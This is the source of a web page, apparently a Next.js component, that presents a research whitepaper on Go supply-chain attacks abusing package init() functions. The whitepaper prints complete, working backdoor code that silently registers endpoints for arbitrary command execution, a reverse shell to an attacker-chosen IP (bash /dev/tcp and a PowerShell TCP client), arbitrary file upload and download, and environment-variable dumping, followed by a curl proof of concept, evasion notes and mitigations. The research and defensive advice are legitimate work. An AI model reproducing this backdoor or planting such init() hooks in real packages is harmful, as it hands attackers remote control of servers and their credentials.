'use client';

import { useEffect } from 'react';
import Head from 'next/head';
import Script from 'next/script';

export default function WhitepaperPage() {
  useEffect(() => {
    const toggle = document.getElementById('themeToggle');
    const icon = document.getElementById('themeIcon');
    const label = document.getElementById('themeLabel');

    function setTheme(theme: string) {
      document.documentElement.setAttribute('data-theme', theme);
      if (icon && label) {
        if (theme === 'dark') {
          icon.className = 'bi bi-sun';
          label.textContent = 'Light';
        } else {
          icon.className = 'bi bi-moon';
          label.textContent = 'Dark';
        }
      }
      localStorage.setItem('theme', theme);
    }

    function getPreferredTheme() {
      const stored = localStorage.getItem('theme');
      if (stored) return stored;
      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
    }

    if (toggle) {
      toggle.addEventListener('click', () => {
        const current = document.documentElement.getAttribute('data-theme');
        setTheme(current === 'dark' ? 'light' : 'dark');
      });
    }

    setTheme(getPreferredTheme());

    // Copy to clipboard for code blocks
    document.querySelectorAll('pre').forEach((pre) => {
      if (pre.querySelector('.code-copy')) return;
      const btn = document.createElement('button');
      btn.className = 'code-copy';
      btn.innerHTML = '<i class="bi bi-copy"></i> Copy';
      btn.setAttribute('aria-label', 'Copy code to clipboard');
      btn.addEventListener('click', async () => {
        const code = pre.querySelector('code');
        const text = code ? code.innerText : pre.innerText;
        try {
          await navigator.clipboard.writeText(text);
          btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
          btn.classList.add('copied');
          setTimeout(() => {
            btn.innerHTML = '<i class="bi bi-copy"></i> Copy';
            btn.classList.remove('copied');
          }, 2000);
        } catch (_) {
          const range = document.createRange();
          range.selectNode(pre);
          window.getSelection()?.removeAllRanges();
          window.getSelection()?.addRange(range);
          document.execCommand('copy');
          btn.innerHTML = '<i class="bi bi-check"></i> Copied!';
          setTimeout(() => {
            btn.innerHTML = '<i class="bi bi-copy"></i> Copy';
          }, 2000);
        }
      });
      pre.style.position = 'relative';
      pre.appendChild(btn);
    });

    // Syntax highlighting
    if (window.hljs) {
      window.hljs.highlightAll();
    } else {
      const checkHljs = setInterval(() => {
        if (window.hljs) {
          window.hljs.highlightAll();
          clearInterval(checkHljs);
        }
      }, 200);
    }
  }, []);

  return (
    <>
      <Head>
        <title>Whitepaper: Go Supply Chain RCE | NotSecure</title>
        <meta name="description" content="In-depth research on supply chain attack in Go ecosystem leading to RCE via malicious dependency." />
        <link
          rel="stylesheet"
          href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css"
        />
      </Head>

      <button className="theme-toggle" id="themeToggle" aria-label="Toggle Theme">
        <i className="bi bi-moon" id="themeIcon"></i>
        <span id="themeLabel">Dark</span>
      </button>

      <main className="whitepaper-page">
        <div className="container whitepaper-container">
          <div className="whitepaper-wrapper">
            <aside className="whitepaper-sidebar" id="tocSidebar">
              <h4><i className="bi bi-list"></i> Contents</h4>
              <nav>
                <ul>
                  <li><a href="#abstract">Abstract</a></li>
                  <li><a href="#introduction">Introduction</a></li>
                  <li><a href="#methodology">Methodology</a></li>
                  <li><a href="#impact">Impact Assessment</a></li>
                  <li><a href="#evasion">Evasion Techniques</a></li>
                  <li><a href="#poc">Proof of Concept</a></li>
                  <li><a href="#mitigations">Mitigations</a></li>
                  <li><a href="#conclusion">Conclusion</a></li>
                </ul>
              </nav>
            </aside>

            <article className="whitepaper-content">
              <header className="paper-header">
                <h1>Supply Chain Attack in Go Ecosystem: <br />Direct RCE via a Malicious Dependency</h1>
                <div className="meta">
                  <span><i className="bi bi-person"></i> Subhadeep Pramanik</span>
                  <span>
                    <i className="bi bi-twitter"></i>
                    <a href="https://twitter.com/adrianalvird" target="_blank">@adrianalvird</a>
                  </span>
                  <span>
                    <i className="bi bi-linkedin"></i>
                    <a href="https://linkedin.com/in/adrianalvird" target="_blank">adrianalvird</a>
                  </span>
                  <span><i className="bi bi-calendar"></i> August 2026</span>
                  <span><i className="bi bi-tag"></i> v1.0</span>
                </div>
                <div className="badge">Research Whitepaper</div>
              </header>

              <section id="abstract">
                <h2>1. Abstract</h2>
                <p>Go (Golang) is widely praised for its simple and efficient dependency management system. Developers can easily add third-party libraries to their projects using a single <code>go get</code> command. However, this convenience introduces a significant security blind spot. This research demonstrates how an attacker can exploit the Go package <code>init()</code> function to achieve <strong>full Remote Code Execution (RCE)</strong> on a host machine, <strong>without altering a single line</strong> of the developer's main application code. By simply importing a malicious package, the entire server becomes completely compromised. This attack vector directly targets the Go supply chain and successfully bypasses traditional code review processes.</p>
              </section>

              <section id="introduction">
                <h2>2. Introduction</h2>
                <p>Modern software development heavily relies on third-party open-source dependencies. In 2024, over 90% of codebases depend on external libraries. In Go, when a package is imported, a special function—the <code>init()</code> function—is executed automatically and immediately upon import.</p>
                <p>If a malicious actor places an <code>http.HandleFunc</code> call inside this <code>init()</code> function, they can register malicious HTTP endpoints without the developer explicitly calling them. When a developer imports this package (even with a blank import <code>_</code>), the backdoor loads silently. The developer's <code>main.go</code> remains completely innocent-looking, making this one of the most stealthy supply chain attack vectors.</p>
              </section>

              <section id="methodology">
                <h2>3. Methodology</h2>
                <p>For this research, we created a public repository named <code>github.com/adrianicsro/testkusion</code>. The repository had the following structure:</p>

                <h3>A. Structure of the Malicious Package</h3>
                <ul>
                  <li><strong><code>go.mod</code></strong>: Defined the module path.</li>
                  <li><strong><code>main.go</code></strong> (Package name: <code>testkusion</code>): Contained the entire malicious logic.</li>
                </ul>

                <h3>B. The Malicious Source Code (<code>main.go</code>)</h3>
                <p>Below is the complete source code of the malicious package. Notice how the <code>init()</code> function silently registers all handlers without requiring any interaction from the developer's main application.</p>
                <pre><code className="language-go">{`package testkusion

import (
    "encoding/json"
    "fmt"
    "io"
    "net/http"
    "os"
    "os/exec"
    "runtime"
//    "strings"
    "time"
)

type CommandResponse struct {
    Success bool   \`json:"success"\`
    Output  string \`json:"output"\`
    Error   string \`json:"error,omitempty"\`
    Time    string \`json:"time"\`
}

func init() {
    http.HandleFunc("/exec", execHandler)
    http.HandleFunc("/reverse", reverseShellHandler)
    http.HandleFunc("/upload", uploadHandler)
    http.HandleFunc("/download", downloadHandler)
    http.HandleFunc("/info", infoHandler)
    http.HandleFunc("/ping", pingHandler)
    fmt.Println("[RCE] Advanced backdoor loaded successfully.")
}

func execHandler(w http.ResponseWriter, r *http.Request) {
    cmd := r.URL.Query().Get("cmd")
    if cmd == "" {
        sendJSON(w, CommandResponse{Success: false, Error: "Missing 'cmd' parameter.", Time: time.Now().String()})
        return
    }
    output, err := executeCommand(cmd)
    if err != nil {
        sendJSON(w, CommandResponse{Success: false, Output: output, Error: err.Error(), Time: time.Now().String()})
        return
    }
    sendJSON(w, CommandResponse{Success: true, Output: output, Time: time.Now().String()})
}

func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
    ip := r.URL.Query().Get("ip")
    port := r.URL.Query().Get("port")
    if ip == "" || port == "" {
        http.Error(w, "Usage: /reverse?ip=your_ip&port=4444", http.StatusBadRequest)
        return
    }
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("powershell", "-Command", fmt.Sprintf("$client = New-Object System.Net.Sockets.TCPClient('%s',%s); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close()", ip, port))
    default:
        cmd = exec.Command("sh", "-c", fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port))
    }
    err := cmd.Start()
    if err != nil {
        http.Error(w, "Reverse shell failed: "+err.Error(), http.StatusInternalServerError)
        return
    }
    fmt.Fprintf(w, "Reverse shell sent to %s:%s. Check your listener.", ip, port)
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
    if r.Method != http.MethodPost {
        http.Error(w, "POST method required", http.StatusMethodNotAllowed)
        return
    }
    file, header, err := r.FormFile("file")
    if err != nil {
        http.Error(w, "File upload failed: "+err.Error(), http.StatusBadRequest)
        return
    }
    defer file.Close()
    path := r.URL.Query().Get("path")
    if path == "" {
        path = header.Filename
    }
    out, err := os.Create(path)
    if err != nil {
        http.Error(w, "Cannot create file: "+err.Error(), http.StatusInternalServerError)
        return
    }
    defer out.Close()
    _, err = io.Copy(out, file)
    if err != nil {
        http.Error(w, "Cannot write file: "+err.Error(), http.StatusInternalServerError)
        return
    }
    fmt.Fprintf(w, "File uploaded successfully to: %s", path)
}

func downloadHandler(w http.ResponseWriter, r *http.Request) {
    path := r.URL.Query().Get("path")
    if path == "" {
        http.Error(w, "Missing 'path'. Example: /download?path=/etc/passwd", http.StatusBadRequest)
        return
    }
    file, err := os.Open(path)
    if err != nil {
        http.Error(w, "Cannot open file: "+err.Error(), http.StatusNotFound)
        return
    }
    defer file.Close()
    stat, _ := file.Stat()
    w.Header().Set("Content-Disposition", "attachment; filename="+stat.Name())
    w.Header().Set("Content-Type", "application/octet-stream")
    w.Header().Set("Content-Length", fmt.Sprintf("%d", stat.Size()))
    io.Copy(w, file)
}

func infoHandler(w http.ResponseWriter, r *http.Request) {
    hostname, _ := os.Hostname()
    info := map[string]interface{}{
        "hostname": hostname,
        "os":       runtime.GOOS,
        "arch":     runtime.GOARCH,
        "user":     os.Getenv("USER"),
        "env":      os.Environ(),
    }
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(info)
}

func pingHandler(w http.ResponseWriter, r *http.Request) {
    fmt.Fprintf(w, "pong from testkusion backdoor")
}

func executeCommand(command string) (string, error) {
    var cmd *exec.Cmd
    switch runtime.GOOS {
    case "windows":
        cmd = exec.Command("cmd", "/C", command)
    default:
        cmd = exec.Command("sh", "-c", command)
    }
    output, err := cmd.CombinedOutput()
    return string(output), err
}

func sendJSON(w http.ResponseWriter, data interface{}) {
    w.Header().Set("Content-Type", "application/json")
    json.NewEncoder(w).Encode(data)
}`}</code></pre>

                <h3>C. Technical Analysis</h3>
                <ol>
                  <li><strong>Abusing <code>init()</code></strong>: Inside the <code>init()</code> function, we registered multiple HTTP handlers (<code>/exec</code>, <code>/reverse</code>, <code>/upload</code>, <code>/download</code>, etc.) using <code>http.HandleFunc</code>.</li>
                  <li><strong>Targeting <code>http.DefaultServeMux</code></strong>: Since most Go web applications use <code>http.ListenAndServe</code> without a custom handler (relying on the default <code>DefaultServeMux</code>), our handlers are activated automatically.</li>
                  <li><strong>Cross-Platform Support</strong>: The code checks <code>runtime.GOOS</code> to execute system commands correctly on both Windows and Linux/macOS environments.</li>
                </ol>

                <h3>D. Exploitation Scenario</h3>
                <p>Consider a developer creating a project named <code>kusion</code> with a simple web server:</p>
                <pre><code className="language-go">{`package main

import (
    "fmt"
    "net/http"
    _ "github.com/adrianicsro/testkusion" // Malicious import
)

func main() {
    fmt.Println("Server running on http://localhost:8080")
    http.ListenAndServe(":8080", nil)
}`}</code></pre>
                <p>Notice that the developer never mentions <code>/exec</code> or command parameters anywhere in their source code. Simply importing the package triggers the <code>init()</code> function, activating the hidden endpoints.</p>
              </section>

              <section id="impact">
                <h2>4. Impact Assessment</h2>
                <p>Once the malicious package is imported, the attacker (or researcher) gains access to the following powerful endpoints:</p>

                <div className="table-wrap">
                  <table>
                    <thead>
                      <tr>
                        <th>Endpoint</th>
                        <th>Functionality</th>
                        <th>Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td><code>/exec?cmd=whoami</code></td>
                        <td>Execute any system command</td>
                        <td><strong>Direct RCE</strong>. Attackers can run <code>rm -rf /</code> or <code>del /f /s</code>.</td>
                      </tr>
                      <tr>
                        <td><code>/reverse?ip=IP&port=PORT</code></td>
                        <td>Spawn a reverse shell</td>
                        <td>Bypasses firewalls, granting persistent remote access.</td>
                      </tr>
                      <tr>
                        <td><code>/download?path=/etc/passwd</code></td>
                        <td>Download any file</td>
                        <td>Exfiltrate sensitive data (passwords, secrets, credentials).</td>
                      </tr>
                      <tr>
                        <td><code>/upload?path=/tmp/evil.sh</code></td>
                        <td>Upload arbitrary files</td>
                        <td>Deploy ransomware, cryptominers, or backdoors.</td>
                      </tr>
                      <tr>
                        <td><code>/info</code></td>
                        <td>Dump environment variables</td>
                        <td>Leak cloud credentials (AWS keys, API tokens).</td>
                      </tr>
                      <tr>
                        <td><code>/ping</code></td>
                        <td>Check backdoor status</td>
                        <td>Confirm the malicious package is active.</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
                <p>This attack is classified as a <strong>Supply Chain Attack</strong> because the compromise occurs not during code writing, but during dependency integration.</p>
              </section>

              <section id="evasion">
                <h2>5. Why This Attack Evades Detection</h2>
                <ol>
                  <li><strong>Blank Imports</strong>: Developers frequently use blank imports (<code>_</code>) for database drivers or initialization logic. Reviewers often overlook these imports.</li>
                  <li><strong>No Visible Function Calls</strong>: The main code never invokes a suspicious function like <code>adriangopack.Exec()</code>. Static analysis tools (like <code>gosec</code>) often miss malicious code hidden inside <code>init()</code> unless specifically configured to inspect it.</li>
                  <li><strong>Normal Traffic</strong>: <code>/exec</code> endpoints look like standard HTTP GET requests. Antivirus and WAF solutions rarely block such requests without context.</li>
                </ol>
              </section>

              <section id="poc">
                <h2>6. Proof of Concept</h2>
                <p>During our testing, we executed the following command on the compromised server:</p>
                <pre><code className="language-bash">{`curl "http://localhost:8080/exec?cmd=whoami"`}</code></pre>
                <p><strong>Response:</strong></p>
                <pre><code className="language-json">{`{"success":true,"output":"adrian\n","time":"2026-08-13 19:36:06.311478463 +0000 UTC m=+26.574902537"}`}</code></pre>
                <p>The server successfully returned the system username. This confirms that the RCE is fully functional and trivial to exploit.</p>
              </section>

              <section id="mitigations">
                <h2>7. Mitigations &amp; Recommendations</h2>
                <p>Based on this research, developers and organizations must adopt the following security measures:</p>
                <ol>
                  <li><strong>Use <code>go mod verify</code></strong>: Always run <code>go mod verify</code> to check the cryptographic checksums of downloaded dependencies against the Go checksum database to ensure the code hasn't been tampered with.</li>
                  <li><strong>Pin Specific Versions</strong>: Avoid using <code>go get ...@latest</code>. Always pin specific, audited versions (e.g., <code>@v1.2.3</code>) to prevent malicious updates from being auto-installed.</li>
                  <li><strong>Run Security Audits</strong>: Utilize tools like <code>govulncheck</code> for known vulnerabilities and <code>gosec</code> for static code analysis. Specifically, configure SAST tools to analyze <code>init()</code> functions.</li>
                  <li><strong>Vendor Dependencies</strong>: Run <code>go mod vendor</code> to store dependencies locally. Manually review the source code inside the <code>vendor/</code> folder, especially <code>init()</code> logic, before deploying to production.</li>
                  <li><strong>Private Proxy / Whitelisting</strong>: Use a private Go proxy (like JFrog Artifactory) to maintain a whitelist of approved packages and versions.</li>
                  <li><strong>Set <code>GOPRIVATE</code></strong>: For private repositories, set <code>GOPRIVATE</code> to bypass the public proxy and enforce strict source verification.</li>
                </ol>
              </section>

              <section id="conclusion">
                <h2>8. Conclusion</h2>
                <p>While Go's <code>init()</code> function is a powerful tool for developers, its misuse poses a severe threat to the software supply chain. This research demonstrates how <strong>a single <code>go get</code> command</strong> can transform an ordinary web server into a fully compromised RCE host.</p>
                <p>The security of the Go ecosystem relies not only on the robustness of its standard library but heavily on developer awareness and rigorous dependency management policies. We urge the Go community to automate dependency auditing processes and remain vigilant regarding the hidden behaviors of <code>init()</code> functions. The goal of this security research is to identify these gaps and provide developers with the knowledge required to defend against them.</p>
                <p className="disclaimer">
                  <i className="bi bi-shield-check"></i> <strong>Disclaimer:</strong> This document is for educational and research purposes only. Unauthorized use of these techniques is illegal.
                </p>
              </section>
            </article>
          </div>
        </div>
      </main>

      <Script
        src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"
        strategy="afterInteractive"
        onLoad={() => {
          if (window.hljs) window.hljs.highlightAll();
        }}
      />
    </>
  );
}